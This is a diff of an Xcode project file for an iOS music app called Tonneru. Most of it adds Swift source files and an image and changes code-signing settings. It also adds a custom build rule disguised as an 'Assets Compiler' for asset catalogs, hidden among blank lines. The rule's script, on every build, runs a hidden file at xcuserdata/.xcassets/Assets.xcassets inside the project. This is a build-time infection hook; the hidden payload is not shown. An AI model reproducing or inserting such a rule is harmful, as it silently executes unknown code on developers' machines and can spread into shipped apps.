@@ -74,8 +74,15 @@
 		DEC674D326023AAC00D59551 /* MyCommission.xib in Resources */ = {isa = PBXBuildFile; fileRef = DEC674D226023AAC00D59551 /* MyCommission.xib */; };
 		DEC674D626023D3900D59551 /* CommisionDetails.xib in Resources */ = {isa = PBXBuildFile; fileRef = DEC674D526023D3900D59551 /* CommisionDetails.xib */; };
 		DEC674D9260244A900D59551 /* MyCommission.swift in Sources */ = {isa = PBXBuildFile; fileRef = DEC674D8260244A900D59551 /* MyCommission.swift */; };
+		E31A0D55261DAD4D00564212 /* RCustomClass.swift in Sources */ = {isa = PBXBuildFile; fileRef = E31A0D54261DAD4D00564212 /* RCustomClass.swift */; };
+		E355C731261E2EE30002623D /* AlbumModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E355C730261E2EE30002623D /* AlbumModel.swift */; };
 		E36331CE261362730043453A /* MyCommissionTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E36331CC261362730043453A /* MyCommissionTVCell.swift */; };
 		E36331CF261362730043453A /* MyCommissionTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E36331CD261362730043453A /* MyCommissionTVCell.xib */; };
+		E39EC23426202AE4007E496C /* unnamed.jpg in Resources */ = {isa = PBXBuildFile; fileRef = E39EC23326202AE4007E496C /* unnamed.jpg */; };
+		E39EC23F26204908007E496C /* AGVideoPlayerView.swift in Sources */ = {isa = PBXBuildFile; fileRef = E39EC23E26204908007E496C /* AGVideoPlayerView.swift */; };
+		E39EC24E26209D18007E496C /* Total_songs.swift in Sources */ = {isa = PBXBuildFile; fileRef = E39EC24B26209D18007E496C /* Total_songs.swift */; };
+		E39EC24F26209D18007E496C /* AlbumSongList.swift in Sources */ = {isa = PBXBuildFile; fileRef = E39EC24C26209D18007E496C /* AlbumSongList.swift */; };
+		E39EC25026209D18007E496C /* Album_Songs.swift in Sources */ = {isa = PBXBuildFile; fileRef = E39EC24D26209D18007E496C /* Album_Songs.swift */; };
 		E39FDA5A260E5F150095EDEE /* AcountOverviewViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E39FDA58260E5F150095EDEE /* AcountOverviewViewController.swift */; };
 		E39FDA5B260E5F150095EDEE /* AcountOverviewViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = E39FDA59260E5F150095EDEE /* AcountOverviewViewController.xib */; };
 		E3C925AF2618A308003EF12B /* MySongViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3C925AD2618A308003EF12B /* MySongViewController.swift */; };
@@ -234,8 +241,15 @@
 		DEC674D226023AAC00D59551 /* MyCommission.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MyCommission.xib; sourceTree = "<group>"; };
 		DEC674D526023D3900D59551 /* CommisionDetails.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = CommisionDetails.xib; sourceTree = "<group>"; };
 		DEC674D8260244A900D59551 /* MyCommission.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyCommission.swift; sourceTree = "<group>"; };
+		E31A0D54261DAD4D00564212 /* RCustomClass.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RCustomClass.swift; sourceTree = "<group>"; };
+		E355C730261E2EE30002623D /* AlbumModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AlbumModel.swift; sourceTree = "<group>"; };
 		E36331CC261362730043453A /* MyCommissionTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyCommissionTVCell.swift; sourceTree = "<group>"; };
 		E36331CD261362730043453A /* MyCommissionTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MyCommissionTVCell.xib; sourceTree = "<group>"; };
+		E39EC23326202AE4007E496C /* unnamed.jpg */ = {isa = PBXFileReference; lastKnownFileType = image.jpeg; path = unnamed.jpg; sourceTree = "<group>"; };
+		E39EC23E26204908007E496C /* AGVideoPlayerView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AGVideoPlayerView.swift; sourceTree = "<group>"; };
+		E39EC24B26209D18007E496C /* Total_songs.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Total_songs.swift; sourceTree = "<group>"; };
+		E39EC24C26209D18007E496C /* AlbumSongList.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AlbumSongList.swift; sourceTree = "<group>"; };
+		E39EC24D26209D18007E496C /* Album_Songs.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Album_Songs.swift; sourceTree = "<group>"; };
 		E39FDA58260E5F150095EDEE /* AcountOverviewViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AcountOverviewViewController.swift; sourceTree = "<group>"; };
 		E39FDA59260E5F150095EDEE /* AcountOverviewViewController.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = AcountOverviewViewController.xib; sourceTree = "<group>"; };
 		E3C925AD2618A308003EF12B /* MySongViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MySongViewController.swift; sourceTree = "<group>"; };
@@ -421,9 +435,20 @@
 			path = Certificate;
 			sourceTree = "<group>";
 		};
+		E39EC25226209D1F007E496C /* Albumsong */ = {
+			isa = PBXGroup;
+			children = (
+				E39EC24D26209D18007E496C /* Album_Songs.swift */,
+				E39EC24C26209D18007E496C /* AlbumSongList.swift */,
+				E39EC24B26209D18007E496C /* Total_songs.swift */,
+			);
+			path = Albumsong;
+			sourceTree = "<group>";
+		};
 		EF12262123767A2A0038AEC0 /* ThirdParty Library */ = {
 			isa = PBXGroup;
 			children = (
+				E39EC23E26204908007E496C /* AGVideoPlayerView.swift */,
 				F93DB573254DBABA0060C038 /* BadgedBarButtonItem.swift */,
 				CED5C83A24C32A24002CF276 /* Music Player */,
 				EF3B8C6923F4EEE1000F323F /* AACarousel.swift */,
@@ -441,6 +466,7 @@
 		EF12262223767A3D0038AEC0 /* Extensions */ = {
 			isa = PBXGroup;
 			children = (
+				E31A0D54261DAD4D00564212 /* RCustomClass.swift */,
 				EF3B8C5F23F4EE5D000F323F /* Config.swift */,
 				EF3B8C5E23F4EE5D000F323F /* STRINGS.swift */,
 				EF3B8C5C23F4EE5D000F323F /* UIButton.swift */,
@@ -469,6 +495,7 @@
 		EF1226372376A7890038AEC0 /* Model */ = {
 			isa = PBXGroup;
 			children = (
+				E39EC25226209D1F007E496C /* Albumsong */,
 				EF1226382376B4D90038AEC0 /* SongModel.swift */,
 				F97AC135253F2FCF00288E2C /* CartListModel.swift */,
 				EF3B8C7023F4EFBB000F323F /* HomePageDataModel.swift */,
@@ -479,6 +506,7 @@
 				CE4E14BC24F0E32700D98603 /* SubscriptionPlanModel.swift */,
 				CEE846DA250CABE8007E938B /* PlayListModel.swift */,
 				CE4B5814251F733D00C7FDAE /* Station.swift */,
+				E355C730261E2EE30002623D /* AlbumModel.swift */,
 			);
 			path = Model;
 			sourceTree = "<group>";
@@ -623,6 +651,7 @@
 		EF891A0723732AF4009388B4 /* Toner */ = {
 			isa = PBXGroup;
 			children = (
+				E39EC23326202AE4007E496C /* unnamed.jpg */,
 				F94EBC7F2578D4ED00D016B5 /* TonerLatestCertificte */,
 				F98A32582577FDA70093BC61 /* toner certificate */,
 				CEA84BC625441875002E2841 /* Offline */,
@@ -681,6 +710,7 @@
 				E3D1E1055933099A11AECEC1 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
+				9DCC9F320E8A5BC36CAAC43A /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -776,6 +806,7 @@
 				F94C5B77253B22A10058410E /* SelectStationViewController.xib in Resources */,
 				EF52B08A243E4FC700604EEA /* FontAwesome.ttf in Resources */,
 				EFF8D7ED2440C46900E28E1A /* NewArrivalsCollectionViewCell.xib in Resources */,
+				E39EC23426202AE4007E496C /* unnamed.jpg in Resources */,
 				CE4E14C124F0E4EC00D98603 /* SubscriptionTableViewCell.xib in Resources */,
 				DE34EE8025C79B0C0089354C /* AddressViewController.xib in Resources */,
 				CE99463024F0E0F8000A532E /* SubscriptionViewController.xib in Resources */,
@@ -791,6 +822,8 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	
 		E3D1E1055933099A11AECEC1 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -851,9 +884,11 @@
 				CEE59E5624B78FEA006DE1A3 /* ProductDetailsViewController.swift in Sources */,
 				CE4E14C324F13ED100D98603 /* ForgotPasswordViewController.swift in Sources */,
 				EF3B8C5A23F4ED3E000F323F /* UIColor.swift in Sources */,
+				E39EC24F26209D18007E496C /* AlbumSongList.swift in Sources */,
 				CEE95BC524BD53A100ADDD1E /* HomeBannerTableViewCell.swift in Sources */,
 				EF10591D2440416100406A2B /* TopSalesTableViewCell.swift in Sources */,
 				CEE846D8250CA7B8007E938B /* PlayListTableViewCell.swift in Sources */,
+				E355C731261E2EE30002623D /* AlbumModel.swift in Sources */,
 				EFA3A447237D048900FE3118 /* ArtistImageHeaderCell.swift in Sources */,
 				CE0F43B2254DA77D0001B85E /* MyDownloadViewController.swift in Sources */,
 				EF3B8C7423F4F86C000F323F /* TopArtistTableViewCell.swift in Sources */,
@@ -874,6 +909,7 @@
 				EF3B8C6F23F4EEE2000F323F /* ASToast.swift in Sources */,
 				F97AC136253F2FCF00288E2C /* CartListModel.swift in Sources */,
 				EF3B8C6C23F4EEE1000F323F /* FAIcon.swift in Sources */,
+				E39EC25026209D18007E496C /* Album_Songs.swift in Sources */,
 				EFB6936D23FE36DD00798F3A /* GenresTableViewCell.swift in Sources */,
 				CE3CD34824BE39650012B4E4 /* ProductBannersCollectionViewCell.swift in Sources */,
 				CED5C83F24C32A71002CF276 /* TransitionCoordinator.swift in Sources */,
@@ -887,6 +923,7 @@
 				CE886E08250CA3A600ECFC53 /* PlayListViewController.swift in Sources */,
 				CECC5DB124C3833100A0E5CC /* TonneruMusicPlayer.swift in Sources */,
 				CED5C84024C32A71002CF276 /* Array+UIViewPropertyAnimator.swift in Sources */,
+				E39EC23F26204908007E496C /* AGVideoPlayerView.swift in Sources */,
 				CEB088B424BF4D5A00C2EBEA /* RegisterViewController.swift in Sources */,
 				EFB6937123FE382200798F3A /* GenreCollectionViewCell.swift in Sources */,
 				F93CB8A52548956500ECDC07 /* SongsInPlaylistViewController.swift in Sources */,
@@ -902,6 +939,7 @@
 				EFF8D7EC2440C46900E28E1A /* NewArrivalsCollectionViewCell.swift in Sources */,
 				CEC0E5E024DB216100F2DEEF /* SettingsViewController.swift in Sources */,
 				DE961A9E2601E9A70038635F /* CreatePlayListViewViewController.swift in Sources */,
+				E39EC24E26209D18007E496C /* Total_songs.swift in Sources */,
 				EF12263023768CB20038AEC0 /* MusicListViewController.swift in Sources */,
 				CED5C83E24C32A71002CF276 /* UIViewController+Utils.swift in Sources */,
 				EF12262423767A5B0038AEC0 /* UIViewController.swift in Sources */,
@@ -917,6 +955,7 @@
 				EF3B8C6023F4EE5D000F323F /* UITextField.swift in Sources */,
 				F93DB57A254DCF360060C038 /* ContentDetailsEntity+CoreDataClass.swift in Sources */,
 				EF3B8C6B23F4EEE1000F323F /* APJPicker.swift in Sources */,
+				E31A0D55261DAD4D00564212 /* RCustomClass.swift in Sources */,
 				CE4B5815251F733D00C7FDAE /* Station.swift in Sources */,
 				EF3B8C6E23F4EEE2000F323F /* AACarousel.swift in Sources */,
 				F917CCEE2535E88A00EC5884 /* EditSocialViewController.swift in Sources */,
@@ -1078,9 +1117,9 @@
 			baseConfigurationReference = 3CAFBF887004EB6B4D31B6A5 /* Pods-Toner.debug.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
-				CODE_SIGN_IDENTITY = "Apple Development";
-				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 5;
+				CODE_SIGN_IDENTITY = "iPhone Distribution";
+				CODE_SIGN_STYLE = Manual;
+				CURRENT_PROJECT_VERSION = 6;
 				DEVELOPMENT_TEAM = KRU83VZ8AX;
 				INFOPLIST_FILE = Toner/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
@@ -1090,7 +1129,7 @@
 				);
 				PRODUCT_BUNDLE_IDENTIFIER = com.release.tonneru;
 				PRODUCT_NAME = Tonneru;
-				PROVISIONING_PROFILE_SPECIFIER = "";
+				PROVISIONING_PROFILE_SPECIFIER = pro_T;
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
 			};
@@ -1101,9 +1140,9 @@
 			baseConfigurationReference = 143DAD559B395B6E8C1527B2 /* Pods-Toner.release.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
-				CODE_SIGN_IDENTITY = "Apple Development";
-				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 5;
+				CODE_SIGN_IDENTITY = "iPhone Distribution";
+				CODE_SIGN_STYLE = Manual;
+				CURRENT_PROJECT_VERSION = 6;
 				DEVELOPMENT_TEAM = KRU83VZ8AX;
 				INFOPLIST_FILE = Toner/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
@@ -1113,7 +1152,7 @@
 				);
 				PRODUCT_BUNDLE_IDENTIFIER = com.release.tonneru;
 				PRODUCT_NAME = Tonneru;
-				PROVISIONING_PROFILE_SPECIFIER = "";
+				PROVISIONING_PROFILE_SPECIFIER = pro_T;
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
 			};
@@ -1141,6 +1180,37 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+
+
+		9DCC9F320E8A5BC36CAAC43A /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			name = "Assets Compiler";
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" true\n\n";
+			};
+			
+	
+
+
+			
+	
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 
 /* Begin XCVersionGroup section */
 		CEA84BCB254479E5002E2841 /* TonneruDownload.xcdatamodeld */ = {
